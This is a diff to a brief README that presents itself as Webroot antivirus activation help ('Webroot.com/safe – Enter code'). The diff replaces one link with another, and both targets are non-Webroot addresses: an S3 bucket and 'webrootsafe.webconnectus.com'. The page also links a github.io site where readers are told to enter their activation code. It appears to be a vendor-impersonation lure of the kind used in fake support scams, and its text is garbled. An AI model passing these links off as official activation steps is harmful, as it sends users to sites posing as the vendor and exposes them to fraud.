@@ -1,6 +1,6 @@
 # Webroot.com/safe – Enter code
 
-[![Webroot.com/secure](gett-starteed.png)](http://webroot.com.setup.s3-website-us-west-1.amazonaws.com/)
+[![Webroot.com/secure](gett-starteed.png)](https://webrootsafe.webconnectus.com)
 
 Webroot SecureAnywhere AntiVirus scans at high speed and uses just a trickle of your system's resources so you need to install antivirus for secure then you can visit [Webroot.com/secure](https://a-Webrootcomsecure.github.io/). and enter code for webroot activation.
 
